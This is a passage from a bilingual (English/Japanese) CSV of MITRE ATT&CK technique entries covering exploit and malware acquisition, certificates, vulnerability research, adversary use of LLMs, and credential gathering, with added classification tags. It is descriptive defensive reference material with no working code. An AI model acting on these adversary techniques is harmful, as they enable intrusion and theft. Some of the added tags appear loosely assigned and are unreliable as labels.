control.",攻撃者は標的攻撃時に使用可能な自己署名SSL/TLS証明書を作成する可能性がある。SSL/TLS証明書は信頼を確立するために設計されている。これには鍵に関する情報、所有者の身元情報、および証明書の内容が正しいことを検証した実体のデジタル署名が含まれる。署名が有効であり、証明書を検証する者が署名者を信頼する場合、その鍵を使用して所有者と通信できることが保証される。 自己署名の場合、デジタル証明書には第三者認証機関（CA）の署名に伴う信頼要素が欠如します。 攻撃者は、C2通信の暗号化（例：[非対称暗号化](https://attack.mitre.org/techniques/T1573/002)と[Webプロトコル](https://attack.mitre.org/techniques/T1071/001）や、信頼のルート（例：[ルート証明書のインストール](https://attack.mitre.org/techniques/T1553/004)）に追加された場合、[中間者攻撃](https://attack.mitre.org/techniques/T1557)を可能にするなど、攻撃活動を推進するために使用できる自己署名SSL/TLS証明書を作成する可能性があります。 デジタル証明書を作成した後、攻撃者はその証明書を（[デジタル証明書のインストール](https://attack.mitre.org/techniques/T1608/003)を参照）、自身の管理下にあるインフラストラクチャにインストールする可能性があります。,resource-development,PRE,destructive_impact,unknown,authentication_system;privileged_account,specified,Unknown,subtechnique;has_created_ts;has_modified_ts,S0,unknown,,,,,Reconnaissance;ResourceDevelopment,attack-pattern--1cec9319-743b-4840-bb65-431547bce82a,2020-10-01T01:42:24.974Z,2025-04-15T22:18:36.653Z,,,,
T1587.004,T1587,Exploits,エクスプロイト,"Adversaries may develop exploits that can be used during targeting. An exploit takes advantage of a bug or vulnerability in order to cause unintended or unanticipated behavior to occur on computer hardware or software. Rather than finding/modifying exploits from online or purchasing them from exploit vendors, an adversary may develop their own exploits.(Citation: NYTStuxnet) Adversaries may use information acquired via [Vulnerabilities](https://attack.mitre.org/techniques/T1588/006) to focus exploit development efforts. As part of the exploit development process, adversaries may uncover exploitable vulnerabilities through methods such as fuzzing and patch analysis.(Citation: Irongeek Sims BSides 2017) As with legitimate development efforts, different skill sets may be required for developing exploits. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's exploit development capabilities, provided the adversary plays a role in shaping requirements and maintains an initial degree of exclusivity to the exploit. Adversaries may use exploits during various phases of the adversary lifecycle (i.e. [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190), [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203), [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068), [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211), [Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212), [Exploitation of Remote Services](https://attack.mitre.org/techniques/T1210), and [Application or System Exploitation](https://attack.mitre.org/techniques/T1499/004)).",攻撃者は標的攻撃時に使用可能なエクスプロイトを開発する可能性がある。エクスプロイトは、コンピュータハードウェアまたはソフトウェア上で意図しない動作を引き起こすために、バグや脆弱性を悪用する。攻撃者はオンラインでエクスプロイトを発見・改変したり、エクスプロイトベンダーから購入したりする代わりに、独自のエクスプロイトを開発する場合がある。(引用: NYTStuxnet) 敵対者は[脆弱性](https://attack.mitre.org/techniques/T1588/006)を通じて取得した情報を活用し、エクスプロイト開発の取り組みを集中させることがある。エクスプロイト開発プロセスの一環として、敵対者はファジングやパッチ解析などの手法を通じて悪用可能な脆弱性を発見する可能性がある。(引用元: Irongeek Sims BSides 2017) 正規の開発活動と同様に、エクスプロイト開発には異なるスキルセットが必要となる場合がある。必要なスキルは社内に存在する可能性もあるが、外部委託が必要となる場合もある。委託先の活用は、攻撃者が要件策定に関与し、エクスプロイトに対する初期段階の独占権を維持する限り、その攻撃者のエクスプロイト開発能力の延長と見なされる可能性がある。 攻撃者は、攻撃者ライフサイクルの様々なフェーズでエクスプロイトを使用する可能性がある（例：[公開アプリケーションの悪用](https://attack.mitre.org/techniques/T1190)、[クライアント実行のための悪用](https://attack.mitre.org/techniques/T1203)、 [権限昇格のためのエクスプロイト](https://attack.mitre.org/techniques/T1068)、[防御回避のためのエクスプロイト](https://attack.mitre.org/techniques/T1211)、 [認証情報取得のためのエクスプロイト](https://attack.mitre.org/techniques/T1212)、 [リモートサービスの悪用](https://attack.mitre.org/techniques/T1210)、および[アプリケーションまたはシステムの悪用](https://attack.mitre.org/techniques/T1499/004))。,resource-development,PRE,credential_abuse,unknown,authentication_system;endpoint_execution;network_connectivity;cloud_control_plane,specified,Unknown,subtechnique;has_created_ts;has_modified_ts,S0,unknown,,,,,Reconnaissance;ResourceDevelopment,attack-pattern--bbc3cba7-84ae-410d-b18b-16750731dfa2,2020-10-01T01:48:15.511Z,2025-04-15T22:33:51.026Z,,,,
T1588,,Obtain Capabilities,能力の取得,"Adversaries may buy and/or steal capabilities that can be used during targeting. Rather than developing their own capabilities in-house, adversaries may purchase, freely download, or steal them. Activities may include the acquisition of malware, software (including licenses), exploits, certificates, and information relating to vulnerabilities. Adversaries may obtain capabilities to support their operations throughout numerous phases of the adversary lifecycle. In addition to downloading free malware, software, and exploits from the internet, adversaries may purchase these capabilities from third-party entities. Third-party entities can include technology companies that specialize in malware and exploits, criminal marketplaces, or from individuals.(Citation: NationsBuying)(Citation: PegasusCitizenLab) In addition to purchasing capabilities, adversaries may steal capabilities from third-party entities (including other adversaries). This can include stealing software licenses, malware, SSL/TLS and code-signing certificates, or raiding closed databases of vulnerabilities or exploits.(Citation: DiginotarCompromise)",敵対者は、標的攻撃時に使用可能な能力を購入および/または窃取する可能性がある。自社内で能力を開発する代わりに、敵対者はそれらを購入、無償ダウンロード、または窃取する可能性がある。活動には、マルウェア、ソフトウェア（ライセンスを含む）、エクスプロイト、証明書、および脆弱性に関連する情報の取得が含まれる。敵対者は、敵対者ライフサイクルの多数のフェーズを通じて、自らの作戦を支援する能力を入手する可能性がある。 インターネットからの無料マルウェア・ソフトウェア・エクスプロイトのダウンロードに加え、敵対者は第三者組織からこれらの能力を購入する可能性がある。第三者組織には、マルウェアやエクスプロイトを専門とする技術企業、犯罪マーケットプレイス、個人などが含まれる（引用元：NationsBuying）（引用元：PegasusCitizenLab）。能力の購入に加え、敵対者は第三者組織（他の敵対者を含む）から能力を窃取する可能性がある。 これにはソフトウェアライセンス、マルウェア、SSL/TLSおよびコード署名証明書の窃取、あるいは脆弱性やエクスプロイトの非公開データベースへの侵入が含まれる。（引用元：DiginotarCompromise）,resource-development,PRE,other,unknown,database_access;logging_monitoring,specified,Log / Monitoring Server,has_created_ts;has_modified_ts,S0,unknown,,,,,Reconnaissance;ResourceDevelopment,attack-pattern--ce0687a0-e692-4b77-964a-0784a8e54ff1,2020-10-01T01:56:24.776Z,2025-04-15T22:54:16.100Z,,,,
T1588.001,T1588,Malware,マルウェア,"Adversaries may buy, steal, or download malware that can be used during targeting. Malicious software can include payloads, droppers, post-compromise tools, backdoors, packers, and C2 protocols. Adversaries may acquire malware to support their operations, obtaining a means for maintaining control of remote machines, evading defenses, and executing post-compromise behaviors. In addition to downloading free malware from the internet, adversaries may purchase these capabilities from third-party entities. Third-party entities can include technology companies that specialize in malware development, criminal marketplaces (including Malware-as-a-Service, or MaaS), or from individuals. In addition to purchasing malware, adversaries may steal and repurpose malware from third-party entities (including other adversaries).",敵対者は標的攻撃時に使用可能なマルウェアを購入、窃取、またはダウンロードする可能性がある。悪意のあるソフトウェアにはペイロード、ドロッパー、侵害後ツール、バックドア、パッカー、C2プロトコルが含まれる。敵対者は遠隔マシンの制御維持、防御回避、侵害後行動の実行手段を得るため、作戦支援目的でマルウェアを入手する。 インターネットから無料のマルウェアをダウンロードする以外に、敵対者は第三者組織からこれらの機能を購入する場合がある。第三者組織には、マルウェア開発を専門とする技術企業、犯罪マーケットプレイス（マルウェア・アズ・ア・サービス（MaaS）を含む）、または個人からの購入が含まれる。マルウェアの購入に加え、敵対者は第三者組織（他の敵対者を含む）からマルウェアを窃取し転用する場合がある。,resource-development,PRE,c2_communication,unknown,network_connectivity;logging_monitoring,specified,Log / Monitoring Server,subtechnique;has_created_ts;has_modified_ts,S0,unknown,,,,,Reconnaissance;ResourceDevelopment,attack-pattern--7807d3a4-a885-4639-a786-c1ed41484970,2020-10-01T02:06:11.499Z,2025-04-15T22:47:58.443Z,,,,
T1588.002,T1588,Tool,ツール,"Adversaries may buy, steal, or download software tools that can be used during targeting. Tools can be open or closed source, free or commercial. A tool can be used for malicious purposes by an adversary, but (unlike malware) were not intended to be used for those purposes (ex: [PsExec](https://attack.mitre.org/software/S0029)). Tool acquisition can involve the procurement of commercial software licenses, including for red teaming tools such as [Cobalt Strike](https://attack.mitre.org/software/S0154). Commercial software may be obtained through purchase, stealing licenses (or licensed copies of the software), or cracking trial versions.(Citation: Recorded Future Beacon 2019) Adversaries may obtain tools to support their operations, including to support execution of post-compromise behaviors. In addition to freely downloading or purchasing software, adversaries may steal software and/or software licenses from third-party entities (including other adversaries).",攻撃者は標的攻撃時に使用可能なソフトウェアツールを購入、窃取、またはダウンロードする可能性がある。ツールはオープンソース／クローズドソース、無料／商用を問わない。ツールは攻撃者によって悪意ある目的に使用される可能性があるが、（マルウェアとは異なり）当初その目的で使用される意図はなかった（例：[PsExec](https://attack.mitre.org/software/S0029)）。 ツールの取得には、[Cobalt Strike](https://attack.mitre.org/software/S0154)などのレッドチームツールを含む商用ソフトウェアライセンスの調達が含まれる場合がある。 商用ソフトウェアは、購入、ライセンス（またはソフトウェアのライセンスコピー）の窃取、試用版のクラッキングによって入手される可能性がある（引用元：Recorded Future Beacon 2019）。敵対者は、侵害後の行動の実行を支援するなど、自らの活動を支援するツールを入手する可能性がある。ソフトウェアの無料ダウンロードや購入に加え、敵対者は第三者（他の敵対者を含む）からソフトウェアやソフトウェアライセンスを窃取する場合がある。,resource-development,PRE,c2_communication,unknown,endpoint_execution,specified,Unknown,subtechnique;has_created_ts;has_modified_ts,S0,unknown,,,,,Reconnaissance;ResourceDevelopment,attack-pattern--a2fdce72-04b2-409a-ac10-cc1695f4fce0,2020-10-01T02:08:33.977Z,2025-04-15T23:16:21.007Z,,,,
T1588.003,T1588,Code Signing Certificates,コード署名証明書,"Adversaries may buy and/or steal code signing certificates that can be used during targeting. Code signing is the process of digitally signing executables and scripts to confirm the software author and guarantee that the code has not been altered or corrupted. Code signing provides a level of authenticity for a program from the developer and a guarantee that the program has not been tampered with.(Citation: Wikipedia Code Signing) Users and/or security tools may trust a signed piece of code more than an unsigned piece of code even if they don't know who issued the certificate or who the author is. Prior to [Code Signing](https://attack.mitre.org/techniques/T1553/002), adversaries may purchase or steal code signing certificates for use in operations. The purchase of code signing certificates may be done using a front organization or using information stolen from a previously compromised entity that allows the adversary to validate to a certificate provider as that entity. Adversaries may also steal code signing materials directly from a compromised third-party.",敵対者は標的攻撃時に使用可能なコード署名証明書を購入および/または窃取する可能性がある。コード署名とは、実行ファイルやスクリプトにデジタル署名を施し、ソフトウェア作成者を確認するとともにコードが改変・破損されていないことを保証するプロセスである。コード署名は開発者によるプログラムの真正性を一定レベルで保証し、プログラムが改ざんされていないことを保証する。（出典: Wikipedia コード署名）ユーザーやセキュリティツールは、証明書の発行元や作成者が不明であっても、署名付きコードを署名なしコードより信頼する場合がある。[コード署名](https://attack.mitre.org/techniques/T1553/002)導入以前、攻撃者は作戦に利用するためコード署名証明書を購入または窃取することがあった。 コード署名証明書の購入は、フロント組織を利用するか、過去に侵害された組織から盗んだ情報を使用して、攻撃者が証明書発行者に対してその組織として認証できるように行う場合があります。攻撃者は、侵害された第三者から直接コード署名材料を盗むことも可能です。,resource-development,PRE,script_command_execution,unknown,user_interaction;endpoint_execution,specified,Unknown,subtechnique;has_created_ts;has_modified_ts,S0,unknown,,,,,Reconnaissance;ResourceDevelopment,attack-pattern--e7cbc1de-1f79-48ee-abfd-da1241c65a15,2020-10-01T02:11:47.237Z,2025-04-15T22:05:19.685Z,,,,
T1588.004,T1588,Digital Certificates,デジタル証明書,"Adversaries may buy and/or steal SSL/TLS certificates that can be used during targeting. SSL/TLS certificates are designed to instill trust. They include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate with its owner. Adversaries may purchase or steal SSL/TLS certificates to further their operations, such as encrypting C2 traffic (ex: [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002) with [Web Protocols](https://attack.mitre.org/techniques/T1071/001)) or even enabling [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) if the certificate is trusted or otherwise added to the root of trust (i.e. [Install Root Certificate](https://attack.mitre.org/techniques/T1553/004)). The purchase of digital certificates may be done using a front organization or using information stolen from a previously compromised entity that allows the adversary to validate to a certificate provider as that entity. Adversaries may also steal certificate materials directly from a compromised third-party, including from certificate authorities.(Citation: DiginotarCompromise) Adversaries may register or hijack domains that they will later purchase an SSL/TLS certificate for. Certificate authorities exist that allow adversaries to acquire SSL/TLS certificates, such as domain validation certificates, for free.(Citation: Let's Encrypt FAQ) After obtaining a digital certificate, an adversary may then install that certificate (see [Install Digital Certificate](https://attack.mitre.org/techniques/T1608/003)) on infrastructure under their control.",敵対者は標的攻撃時に使用可能なSSL/TLS証明書を購入または窃取する可能性がある。SSL/TLS証明書は信頼を確立するために設計されており、鍵情報、所有者身元情報、証明書内容の正確性を検証した主体のデジタル署名を含む。署名が有効で、証明書を検証する者が署名者を信頼する場合、その鍵を用いて所有者と通信できることが保証される。 攻撃者は、C2通信の暗号化（例：[非対称暗号化](https://attack.mitre.org/techniques/T1573/002)と[Webプロトコル](https://attack.mitre.org/techniques/T1071/001)の組み合わせ）や、 [中間者攻撃](https://attack.mitre.org/techniques/T1557)を可能にする場合もある。これは、証明書が信頼されているか、信頼のルートに追加されている場合（例：[ルート証明書のインストール](https://attack.mitre.org/techniques/T1553/004)）に発生する。 デジタル証明書の購入は、フロント組織を利用するか、過去に侵害されたエンティティから盗んだ情報を使用して、攻撃者が証明書プロバイダーに対してそのエンティティとして認証できるように行う場合があります。攻撃者はまた、侵害された第三者（認証局を含む）から直接証明書素材を盗むこともあります。（引用元: DiginotarCompromise）攻撃者は、後でSSL/TLS証明書を購入するために使用するドメインを登録または乗っ取る場合があります。 敵対者がドメイン検証証明書などのSSL/TLS証明書を無料で取得できる認証局も存在する（引用元：Let's Encrypt FAQ）。デジタル証明書を取得後、敵対者はその証明書を自身の管理下にあるインフラにインストールする（[デジタル証明書のインストール](https://attack.mitre.org/techniques/T1608/003)参照）。,resource-development,PRE,destructive_impact,unknown,privileged_account,specified,Unknown,subtechnique;has_created_ts;has_modified_ts,S0,unknown,,,,,Reconnaissance;ResourceDevelopment,attack-pattern--19401639-28d0-4c3c-adcc-bc2ba22f6421,2020-10-01T02:14:18.044Z,2025-04-15T22:18:17.702Z,,,,
T1588.005,T1588,Exploits,エクスプロイト,"Adversaries may buy, steal, or download exploits that can be used during targeting. An exploit takes advantage of a bug or vulnerability in order to cause unintended or unanticipated behavior to occur on computer hardware or software. Rather than developing their own exploits, an adversary may find/modify exploits from online or purchase them from exploit vendors.(Citation: Exploit Database)(Citation: TempertonDarkHotel)(Citation: NationsBuying) In addition to downloading free exploits from the internet, adversaries may purchase exploits from third-party entities. Third-party entities can include technology companies that specialize in exploit development, criminal marketplaces (including exploit kits), or from individuals.(Citation: PegasusCitizenLab)(Citation: Wired SandCat Oct 2019) In addition to purchasing exploits, adversaries may steal and repurpose exploits from third-party entities (including other adversaries).(Citation: TempertonDarkHotel) An adversary may monitor exploit provider forums to understand the state of existing, as well as newly discovered, exploits. There is usually a delay between when an exploit is discovered and when it is made public. An adversary may target the systems of those known to conduct exploit research and development in order to gain that knowledge for use during a subsequent operation. Adversaries may use exploits during various phases of the adversary lifecycle (i.e. [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190), [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203), [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068), [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211), [Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212), [Exploitation of Remote Services](https://attack.mitre.org/techniques/T1210), and [Application or System Exploitation](https://attack.mitre.org/techniques/T1499/004)).",攻撃者は標的攻撃時に使用可能なエクスプロイトを購入、窃取、またはダウンロードする可能性がある。エクスプロイトはコンピュータハードウェアやソフトウェアに意図しない動作を引き起こすため、バグや脆弱性を悪用する。 敵対者は独自にエクスプロイトを開発する代わりに、オンラインでエクスプロイトを発見・改変したり、エクスプロイトベンダーから購入したりすることがある。（引用元：Exploit Database）（引用元：TempertonDarkHotel）（引用元：NationsBuying）インターネットから無料のエクスプロイトをダウンロードするほか、敵対者は第三者機関からエクスプロイトを購入することもある。 第三者機関には、エクスプロイト開発を専門とする技術企業、犯罪マーケットプレイス（エクスプロイトキットを含む）、個人などが含まれる。（引用元：PegasusCitizenLab）（引用元：Wired SandCat Oct 2019）エクスプロイトの購入に加え、攻撃者は第三者機関（他の攻撃者を含む）からエクスプロイトを盗み転用する場合もある。(引用: TempertonDarkHotel) 攻撃者は、既存および新規発見されたエクスプロイトの状況を把握するため、エクスプロイト提供者のフォーラムを監視することがある。エクスプロイトが発見されてから公開されるまでには通常時間差が生じる。攻撃者は、その知識を後続の作戦で活用するため、エクスプロイトの研究開発を行っていると知られる組織のシステムを標的とする可能性がある。 攻撃者は攻撃ライフサイクルの様々な段階でエクスプロイトを利用する可能性がある（例：[公開アプリケーションの悪用](https://attack.mitre.org/techniques/T1190)、[クライアント実行のための悪用](https://attack.mitre.org/techniques/T1203)、 [権限昇格のためのエクスプロイト](https://attack.mitre.org/techniques/T1068)、[防御回避のためのエクスプロイト](https://attack.mitre.org/techniques/T1211)、 [認証情報取得のためのエクスプロイト](https://attack.mitre.org/techniques/T1212)、 [リモートサービスの悪用](https://attack.mitre.org/techniques/T1210)、および[アプリケーションまたはシステムの悪用](https://attack.mitre.org/techniques/T1499/004))。,resource-development,PRE,credential_abuse,unknown,authentication_system;endpoint_execution;network_connectivity;database_access;logging_monitoring,specified,Log / Monitoring Server,subtechnique;has_created_ts;has_modified_ts,S0,unknown,,,,,Reconnaissance;ResourceDevelopment,attack-pattern--f4b843c1-7e92-4701-8fed-ce82f8be2636,2020-10-01T02:17:46.086Z,2025-04-15T22:34:05.500Z,,,,
T1588.006,T1588,Vulnerabilities,脆弱性,"Adversaries may acquire information about vulnerabilities that can be used during targeting. A vulnerability is a weakness in computer hardware or software that can, potentially, be exploited by an adversary to cause unintended or unanticipated behavior to occur. Adversaries may find vulnerability information by searching open databases or gaining access to closed vulnerability databases.(Citation: National Vulnerability Database) An adversary may monitor vulnerability disclosures/databases to understand the state of existing, as well as newly discovered, vulnerabilities. There is usually a delay between when a vulnerability is discovered and when it is made public. An adversary may target the systems of those known to conduct vulnerability research (including commercial vendors). Knowledge of a vulnerability may cause an adversary to search for an existing exploit (i.e. [Exploits](https://attack.mitre.org/techniques/T1588/005)) or to attempt to develop one themselves (i.e. [Exploits](https://attack.mitre.org/techniques/T1587/004)).",敵対者は標的選定時に利用可能な脆弱性に関する情報を入手する可能性がある。脆弱性とは、コンピュータのハードウェアまたはソフトウェアにおける弱点であり、敵対者が悪用することで意図しない動作や予期せぬ動作を引き起こす可能性がある。 敵対者は公開データベースを検索したり、非公開の脆弱性データベースへのアクセス権を取得したりして脆弱性情報を入手する可能性がある。（出典：National Vulnerability Database）敵対者は脆弱性開示情報／データベースを監視し、既存および新規発見された脆弱性の状況を把握する可能性がある。脆弱性が発見されてから公開されるまでには通常時間差が生じる。敵対者は脆弱性研究を実施していることが知られている組織（商用ベンダーを含む）のシステムを標的とする可能性がある。 脆弱性の知識は、攻撃者に既存のエクスプロイト（例：[Exploits](https://attack.mitre.org/techniques/T1588/005)）の探索や、自ら開発を試みさせる（例：[Exploits](https://attack.mitre.org/techniques/T1587/004)）可能性がある。。,resource-development,PRE,discovery_enumeration,unknown,database_access;logging_monitoring,specified,Unknown,subtechnique;has_created_ts;has_modified_ts,S0,unknown,,,,,Reconnaissance;ResourceDevelopment,attack-pattern--2b5aa86b-a0df-4382-848d-30abea443327,2020-10-15T02:59:38.628Z,2025-04-15T23:19:21.267Z,,,,
T1588.007,T1588,Artificial Intelligence,人工知能,"Adversaries may obtain access to generative artificial intelligence tools, such as large language models (LLMs), to aid various techniques during targeting. These tools may be used to inform, bolster, and enable a variety of malicious tasks, including conducting [Reconnaissance](https://attack.mitre.org/tactics/TA0043), creating basic scripts, assisting social engineering, and even developing payloads.(Citation: MSFT-AI) For example, by utilizing a publicly available LLM an adversary is essentially outsourcing or automating certain tasks to the tool. Using AI, the adversary may draft and generate content in a variety of written languages to be used in [Phishing](https://attack.mitre.org/techniques/T1566)/[Phishing for Information](https://attack.mitre.org/techniques/T1598) campaigns. The same publicly available tool may further enable vulnerability or other offensive research supporting [Develop Capabilities](https://attack.mitre.org/techniques/T1587). AI tools may also automate technical tasks by generating, refining, or otherwise enhancing (e.g., [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027)) malicious scripts and payloads.(Citation: OpenAI-CTI) Finally, AI-generated text, images, audio, and video may be used for fraud, [Impersonation](https://attack.mitre.org/techniques/T1656), and other malicious activities.(Citation: Google-Vishing24)(Citation: IC3-AI24)(Citation: WSJ-Vishing-AI24)",敵対者は、標的選定時の様々な手法を支援するため、大規模言語モデル（LLM）などの生成型人工知能ツールへのアクセスを得る可能性があります。 これらのツールは、[偵察](https://attack.mitre.org/tactics/TA0043)の実施、基本的なスクリプトの作成、ソーシャルエンジニアリングの支援、さらにはペイロードの開発に至るまで、様々な悪意のあるタスクの立案、強化、実行に利用される可能性がある。(引用元: MSFT-AI) 例えば、公開されているLLMを利用することで、攻撃者は本質的に特定のタスクをツールに外注または自動化していることになる。 AIを活用することで、攻撃者は[フィッシング](https://attack.mitre.org/techniques/T1566)/[情報収集型フィッシング](https://attack.mitre.org/techniques/T1598)キャンペーンで使用する、様々な言語によるコンテンツの草案作成や生成が可能になります。 同じ公開ツールは、[能力開発](https://attack.mitre.org/techniques/T1587)を支援する脆弱性調査やその他の攻撃的研究をさらに可能にする。 AIツールは、悪意のあるスクリプトやペイロードを生成、改良、あるいは強化（例：[難読化されたファイルや情報](https://attack.mitre.org/techniques/T1027)）することで、技術的なタスクを自動化することも可能です。(引用元: OpenAI-CTI) 最後に、AIが生成したテキスト、画像、音声、動画は、詐欺、[なりすまし](https://attack.mitre.org/techniques/T1656)、その他の悪意のある活動に利用される可能性がある。(引用元: Google-Vishing24)(引用元: IC3-AI24)(引用元: WSJ-Vishing-AI24),resource-development,PRE,script_command_execution,unknown,user_interaction;endpoint_execution;file_storage_access,specified,Unknown,subtechnique;has_created_ts;has_modified_ts,S0,unknown,,,,,Reconnaissance;ResourceDevelopment,attack-pattern--0cc222f5-c3ff-48e6-9f52-3314baf9d37e,2024-03-11T13:37:31.836Z,2025-04-15T19:58:05.447Z,,,,
T1589,,Gather Victim Identity Information,被害者の身元情報を収集する,"Adversaries may gather information about the victim's identity that can be used during targeting. Information about identities may include a variety of details, including personal data (ex: employee names, email addresses, security question responses, etc.) as well as sensitive details such as credentials or multi-factor authentication (MFA) configurations. Adversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about users could also be enumerated via other active means (i.e. [Active Scanning](https://attack.mitre.org/techniques/T1595)) such as probing and analyzing responses from authentication services that may reveal valid usernames in a system or permitted MFA /methods associated with those usernames.(Citation: GrimBlog UsernameEnum)(Citation: Obsidian SSPR Abuse 2023) Information about victims may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: OPM Leak)(Citation: Register Deloitte)(Citation: Register Uber)(Citation: Detectify Slack Tokens)(Citation: Forbes GitHub Creds)(Citation: GitHub truffleHog)(Citation: GitHub Gitrob)(Citation: CNET Leaks) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566) or [Valid Accounts](https://attack.mitre.org/techniques/T1078)).",敵対者は、標的とする際に使用できる被害者の身元に関する情報を収集する場合があります。 身元に関する情報には、個人データ（例：従業員名、メールアドレス、セキュリティ質問の回答など）や、認証情報や多要素認証（MFA）設定などの機密情報など、様々な詳細が含まれる可能性があります。攻撃者は、[情報フィッシング](https://attack.mitre.org/techniques/T1598)による直接的な引き出しなど、様々な方法でこの情報を収集する可能性があります。 ユーザー情報は、システム内の有効なユーザー名やそれらユーザー名に関連付けられた許可されたMFA/認証方法を明らかにする可能性がある認証サービスからの応答を調査・分析するといった、他の能動的手段（例：[アクティブスキャン](https://attack.mitre.org/techniques/T1595)）によっても列挙される可能性があります。(引用元: GrimBlog UsernameEnum)(引用元: Obsidian SSPR Abuse 2023) 被害者に関する情報は、オンラインまたはその他のアクセス可能なデータセット（例：[ソーシャルメディア](https://attack.mitre.org/techniques/T1593/001) や [被害者所有ウェブサイトの検索](https://attack.mitre.org/techniques/T1594)）を通じて敵対者に晒される可能性もあります。(引用: OPM Leak)(引用: Register Deloitte)(引用: Register Uber)(引用: Detectify Slack Tokens)(引用: Forbes GitHub Creds)(引用: GitHub truffleHog)(引用: GitHub Gitrob)(引用元: CNET Leaks) この情報の収集により、他の偵察手法（例: [公開ウェブサイト/ドメインの検索](https://attack.mitre.org/techniques/T1593) や [情報フィッシング](https://attack.mitre.org/techniques/T1598)）の機会が明らかになる場合があり、運用リソース（例: [アカウント侵害](https://attack.mitre.org/techniques/T1586))、および／または初期アクセス（例：[フィッシング](https://attack.mitre.org/techniques/T1566) または [有効なアカウント](https://attack.mitre.org/techniques/T1078)）の確立につながる可能性がある。,reconnaissance,PRE,credential_abuse,unknown,authentication_system;mfa_in_use;user_interaction;email_infrastructure;logging_monitoring,specified,Log / Monitoring Server;Mail / Collaboration,has_created_ts;has_modified_ts,S0,unknown,,,,,Reconnaissance;ResourceDevelopment,attack-pattern--5282dd9a-d26d-4e16-88b7-7c0f4553daf4,2020-10-02T14:54:59.263Z,2025-04-15T22:37:47.951Z,,,,
T1589.001,T1589,Credentials,認証情報,"Adversaries may gather credentials that can be used during targeting. Account credentials gathered by adversaries may be those directly associated with the target victim organization or attempt to take advantage of the tendency for users to use the same passwords across personal and business accounts. Adversaries may gather credentials from potential victims in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Adversaries may also compromise sites then add malicious content designed to collect website authentication cookies from visitors.(Citation: ATT ScanBox) (Citation: Register Deloitte)(Citation: Register Uber)(Citation: Detectify Slack Tokens)(Citation: Forbes GitHub Creds)(Citation: GitHub truffleHog)(Citation: GitHub Gitrob)(Citation: CNET Leaks) Where multi-factor authentication (MFA) based on out-of-band communications is in use, adversaries may compromise a service provider to gain access to MFA codes and one-time passwords (OTP).(Citation: Okta Scatter Swine 2022) Credential information may also be exposed to adversaries via leaks to online or other accessible data sets (ex: [Search Engines](https://attack.mitre.org/techniques/T1593/002), breach dumps, code repositories, etc.). Adversaries may purchase credentials from dark web markets, such as Russian Market and 2easy, or through access to Telegram channels that distribute logs from infostealer malware.(Citation: Bleeping Computer 2easy 2021)(Citation: SecureWorks Infostealers 2023)(Citation: Bleeping Computer Stealer Logs 2023) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Valid Accounts](https://attack.mitre.org/techniques/T1078)).",攻撃者は標的化時に使用可能な認証情報を収集する可能性がある。攻撃者が収集するアカウント認証情報は、標的となる被害組織に直接関連するもの、あるいはユーザーが個人用と業務用アカウントで同じパスワードを使用する傾向を利用しようとするものとなる。攻撃者は、[情報フィッシング](https://attack.mitre.org/techniques/T1598)による直接的な引き出しなど、様々な方法で潜在的な被害者から認証情報を収集する可能性がある。 攻撃者はまた、サイトを侵害した後、訪問者からウェブサイトの認証クッキーを収集するように設計された悪意のあるコンテンツを追加する場合もある。(引用元: ATT ScanBox) (引用元: Register Deloitte)(引用元: Register Uber)(引用元: Detectify Slack Tokens)(引用元: Forbes GitHub Creds)(引用元: GitHub truffleHog)(引用元: GitHub Gitrob)(引用元: CNET Leaks) 帯域外通信に基づく多要素認証（MFA）が使用されている場合、敵対者はサービスプロバイダーを侵害してMFAコードやワンタイムパスワード（OTP）へのアクセス権を取得する可能性があります。(引用元: Okta Scatter Swine 2022) 認証情報は、オンラインやその他のアクセス可能なデータセット（例: [検索エンジン](https://attack.mitre.org/techniques/T1593/002)、侵害ダンプ、コードリポジトリなど）へのリークを通じて、敵対者にさらされる可能性もあります。 攻撃者は、Russian Marketや2easyなどのダークウェブ市場から、あるいは情報窃取マルウェアのログを配布するTelegramチャンネルへのアクセスを通じて、認証情報を購入する可能性があります。(引用元: Bleeping Computer 2easy 2021)(引用元: SecureWorks Infostealers 2023)(引用元: Bleeping Computer Stealer Logs 2023) この情報の収集により、他の偵察手法（例：[公開ウェブサイト/ドメインの検索](https://attack.mitre.org/techniques/T1593) や [情報フィッシング](https://attack.mitre.org/techniques/T1598)）の機会が明らかになる場合や、運用リソース（例： [アカウント侵害](https://attack.mitre.org/techniques/T1586))、および／または初期アクセス（例：[外部リモートサービス](https://attack.mitre.org/techniques/T1133) または [有効なアカウント](https://attack.mitre.org/techniques/T1078)) の確立につながる可能性があります。,reconnaissance,PRE,credential_abuse,unknown,authentication_system;mfa_in_use;user_interaction;network_connectivity;logging_monitoring,specified,Log / 